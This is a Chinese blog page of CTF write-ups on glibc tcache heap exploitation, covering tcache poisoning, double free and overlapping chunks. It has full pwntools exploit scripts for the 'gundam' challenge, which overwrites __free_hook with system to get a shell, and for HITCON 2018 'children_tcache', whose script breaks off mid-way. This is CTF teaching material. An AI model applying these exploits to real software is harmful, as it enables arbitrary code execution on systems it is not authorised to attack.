@@ -1,0 +1,2211 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="tcache-study | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>tcache-study · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">tcache-study</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            tcache-study
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">5,110</span> / Reading time: <span class="post-count">29 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="tcache介绍"><a href="#tcache介绍" class="headerlink" title="tcache介绍"></a>tcache介绍</h1><p>每个线程有64个bins，以16(8)递增，mensize从24(12)到1032(516).</p>
+<p>每个bin是单链表结构，单个tcache bins默认最多包含7个块。</p>
+<p><strong>chunk进入tcache的情形</strong></p>
+<ol>
+<li>释放时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache</li>
+<li>在_int_malloc中，若fastbins中取出块则将对应bin中其余chunk填入tcache对应项直到填满（smallbins中也是如此）：</li>
+<li>当进入unsorted bin(同时发生堆块合并）中找到精确的大小时，并不是直接返回而是先加入tcache中，直到填满：</li>
+</ol>
+<p><strong>从tcache获取chunk的情形</strong></p>
+<ol>
+<li>在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk</li>
+<li>在遍历完unsorted bin(同时发生堆块合并）之后，若是tcache中有对应大小chunk则取出并返回：</li>
+</ol>
+<p>由上可知malloc会优先考虑tcache，在使用它之前只有size等很少的完整性校验(只有存入前有size &gt;= MINSIZE &amp;&amp; aligned_OK (size) &amp;&amp; !misaligned_chunk (p) &amp;&amp; (uintptr_t) p &lt;= (uintptr_t) -size)，而它本身并没有什么完整性校验，于是利用它进行攻击会简单很多。</p>
+<h1 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h1><p>参考：<a href="https://www.anquanke.com/post/id/104760#h2-3" rel="external nofollow" target="_blank">https://www.anquanke.com/post/id/104760#h2-3</a></p>
+<p>1.The House of Spirit</p>
+<p>在之前，这种利用手段主要用在fastbin，因为它的检查要少很多，包括要释放的chunk大小正确且属于fastbin，下一个chunk大小要适中，不能小于2*SIZE_SZ且不能大于已分配内存。small的检查更多。</p>
+<p>但是若使用tcache，就只需要关心当前chunk的地址及大小，chunk大小也不仅仅是fastbin了。</p>
+<p>2.double free</p>
+<p>和fastbin一样，通过free同一个chunk造成loop bin，但是fastbin不能连续释放同一个chunk，而tcache没有这种限制让它适用更大的chunk。</p>
+<p>3.Overlapping chunks</p>
+<p>若能更改指定chunk的size，增加其值，那么在释放后进入tcache再分配更改后的对应大小就能控制其后的chunk了。</p>
+<p>4.tcache poisoning</p>
+<p>对于已经在tcache里面的chunk，更改它的fd值即可在malloc时分配任意地址！</p>
+<p>5.Smallbin cache filling bck write</p>
+<p>在unsorted bin的unlink中，它回到了最原始的unlink，未进行其他检查(如bck-&gt;fd != victim)，这样又可以进行DWORD SHOOT啦：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+<h1 id="gundam"><a href="#gundam" class="headerlink" title="gundam"></a>gundam</h1><p>安全客writeup写的很详细了。</p>
+<p>题目分析:</p>
+<p>该题目一共可以创建9个gundam，结构如下:</p>
+<p><img src="/assets/tcache/TIM截图20181102125026.png" alt=""></p>
+<p>destroy_gundam函数该函数清除单个gundam。如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 destory_gundam_D32()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  if ( gundam_number_20208C )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Which gundam do you want to Destory:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    if ( v1 &gt; 8 || !gundam_array_2020A0[v1] )   // 这里检查了gundam_array[v1]是否为0</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid choice&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)gundam_array_2020A0[v1] = 0;</span><br><span class="line">    free(*(void **)(gundam_array_2020A0[v1] + 8LL));// 仅仅释放 name_address，并没有清0，同时，也没有释放gundam_info</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No gundam&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>free(*(void **)(gundam_array_2020A0[v1] + 8LL));</code>，这里在释放name的时候，并没有清0，所以，存在double free的问题。</p>
+<p>blow_up_gundam函数会一次性清除所有gundam，如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 below_E22()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( gundam_array_2020A0[i] &amp;&amp; !*(_DWORD *)gundam_array_2020A0[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      free((void *)gundam_array_2020A0[i]);</span><br><span class="line">      gundam_array_2020A0[i] = 0LL;</span><br><span class="line">      --gundam_number_20208C;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路: </p>
+<ol>
+<li>申请9个gundam，然后全部释放，在申请一个gundam得到heap的地址</li>
+<li>连续释放同一个gundam的name，构造tcache_dup</li>
+<li>tcache_poisoning, 申请一个新的gundam，将下一个tcache的fd指向堆中的unsorted bin</li>
+<li>连续申请两个gundam，泄露libc地址</li>
+<li>tcache_poisoning , 修改 free_hook为system的地址</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = int(raw_input(&quot;debug:&quot;))</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./gundam&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.26.so&quot;)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./gundam&quot;)</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def build_gundam(name, gundam_type):</span><br><span class="line">    p.recvuntil(&quot;choice :&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;name of gundam :&quot;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(&quot;type of the gundam :&quot;)</span><br><span class="line">    p.sendline(str(gundam_type))</span><br><span class="line"></span><br><span class="line">def visit_gundam():</span><br><span class="line">    p.recvuntil(&quot;choice :&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    data = p.recvuntil(&quot;Your &quot;)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def destory_gundam(index):</span><br><span class="line">    p.recvuntil(&quot;choice :&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Destory:&quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def blow_up_factory():</span><br><span class="line">    p.recvuntil(&quot;choice :&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line"></span><br><span class="line"># 由于tcache 每个bin链 最长为7,所以通过创建9个gundam，然后删除8个，这样就必然有一个进入unsorted_bin，一个进入fast bin中</span><br><span class="line"># 如果只创建8个gundam，然后删除8个，这样的话，0x110大小的chunk将和top chunk合并，无法进入unsorted bin</span><br><span class="line"># 同理，也可以创建9个gundam，然后删除9个gundam</span><br><span class="line">for i in range(9):</span><br><span class="line">    build_gundam(str(i), 0)</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    destory_gundam(i)</span><br><span class="line"></span><br><span class="line">blow_up_factory()</span><br><span class="line">build_gundam(&quot;&quot;, 0)  # 0 get heap_addr</span><br><span class="line">data = visit_gundam()</span><br><span class="line">heap_addr = u64(&quot;\x00&quot; + data[14:19] + &quot;\x00\x00&quot;)</span><br><span class="line">heap_addr = heap_addr - 0x800</span><br><span class="line">print hex(heap_addr)</span><br><span class="line"></span><br><span class="line">build_gundam(&quot;1&quot;, 0) # 1</span><br><span class="line">destory_gundam(0)</span><br><span class="line">destory_gundam(0)</span><br><span class="line">build_gundam(p64(heap_addr + 0xb50), 0)  # 2</span><br><span class="line">build_gundam(&quot;&quot;, 0) # 3</span><br><span class="line">build_gundam(&quot;&quot;, 0) # 4 get libc_addr</span><br><span class="line">data = visit_gundam()</span><br><span class="line">print data</span><br><span class="line"># get libc_addr</span><br><span class="line">libc_addr = u64(data[0x76:0x7c] + &quot;\x00\x00&quot;) - 0x3dac0a</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">libc.address = libc_addr</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">free_hook = libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line"># 2,3 一样，两次destory，又可以得到 tcache poisoning</span><br><span class="line"># 4 由于地址处于unsorted bin中，再次释放会导致 double free的错误</span><br><span class="line">destory_gundam(1)</span><br><span class="line">destory_gundam(2)</span><br><span class="line">destory_gundam(3)</span><br><span class="line"># destory_gundam(4)</span><br><span class="line">blow_up_factory()</span><br><span class="line"></span><br><span class="line">build_gundam(p64(free_hook), 0)   # 0</span><br><span class="line">build_gundam(&quot;/bin/sh\x00&quot;, 0)     # 1</span><br><span class="line">build_gundam(p64(system_addr), 0)</span><br><span class="line">destory_gundam(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon 2018 children_tcache"></a>hitcon 2018 children_tcache</h1><p>题目分析:</p>
+<p>本题可以创建10个chunk,</p>
+<p>new_heap函数中存在off_by_one漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read_BC8((__int64)&amp;s, size);                  // off_by_one</span><br><span class="line">strcpy(dest, &amp;s);</span><br><span class="line">heap_array_202060[i] = dest;</span><br><span class="line">heap_size_array_2020C0[i] = size;</span><br></pre></td></tr></table></figure>
+<p>read_BC8函数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v3 = __read_chk(0LL, a1, a2, a2);</span><br><span class="line">if ( v3 &lt;= 0 )</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;read error&quot;);</span><br><span class="line">    _exit(1);</span><br><span class="line">&#125;</span><br><span class="line">result = *(unsigned __int8 *)(v3 - 1LL + a1);</span><br><span class="line">if ( (_BYTE)result == 10 )</span><br><span class="line">&#123;</span><br><span class="line">    result = v3 - 1LL + a1;</span><br><span class="line">    *(_BYTE *)result = 0;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>
+<p>思路:</p>
+<ol>
+<li>首先通过off_by_one 构造overlapping，泄露libc地址</li>
+<li>通过overlapping，构造出两个大小相同，指向地址一样的tcache bin</li>
+<li>通过tcache poisoning，任意地址写</li>
+</ol>
+<p><strong>通过overlapping,即便free的时候，指针没有清0，也可以构造double free</strong></p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># debug = int(raw_input(&apos;debug:&apos;))</span><br><span class="line">debug = 1</span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./children_tcache&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.26.so&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def new_heap(size, data):</span><br><span class="line">    p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;Size:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;Data:&quot;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def show_heap(index):</span><br><span class="line">    p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def delete_heap(index):</span><br><span class="line">    p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">new_heap(0x500, &quot;a&quot;) # 0</span><br><span class="line">new_heap(0x68, &quot;b&quot;) # 1</span><br><span class="line">new_heap(0x4f0, &quot;b&quot;) # 2      这里需要超过1032(0x400)，否则释放的时候，将进入tcache</span><br><span class="line"># used to prevent the former chunk being consolidated with the top chunk</span><br><span class="line">new_heap(0x20, &quot;b&quot;) # 3</span><br><span class="line"></span><br><span class="line">delete_heap(1)</span><br><span class="line">delete_heap(0)</span><br><span class="line"></span><br><span class="line"># 通过off_by_one修改next_chunk的size时候，由于上一步delete_heap(1)，会将next_chunk的prev_size字段覆盖为0xDADADADADADADADA,所以需要连续8次创建，并释放，将next_chunk的prev_size字段清空。</span><br><span class="line">for i in range(9):</span><br><span class="line">    new_heap(0x68 - i, &quot;a&quot; * (0x68 - i) + &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">    